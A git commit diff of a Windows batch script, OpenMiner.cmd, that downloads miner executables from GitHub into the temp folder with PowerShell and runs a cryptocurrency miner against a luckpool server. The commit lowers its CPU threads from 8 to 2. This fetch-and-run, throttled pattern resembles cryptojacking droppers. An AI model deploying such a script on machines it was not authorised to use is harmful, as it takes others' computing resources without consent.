70ca202059e436360d81de0a0e699ce64ce6c078
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-25 23:37:54 +0300

    Update OpenMiner.cmd

--- OpenMiner.cmd
+++ OpenMiner.cmd
@@ -4,5 +4,5 @@ cd %temp%
 if not exist "hellminer.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/hellminer.exe" -OutFile "hellminer.exe"
 if not exist "verus-solver.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/verus-solver.exe" -OutFile "verus-solver.exe"
 
-hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKmtJ9n4RDNoG95Y6sxKST3wyiHgDG5t4M.x -p x --cpu 8
+hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKmtJ9n4RDNoG95Y6sxKST3wyiHgDG5t4M.x -p x --cpu 2
 exit
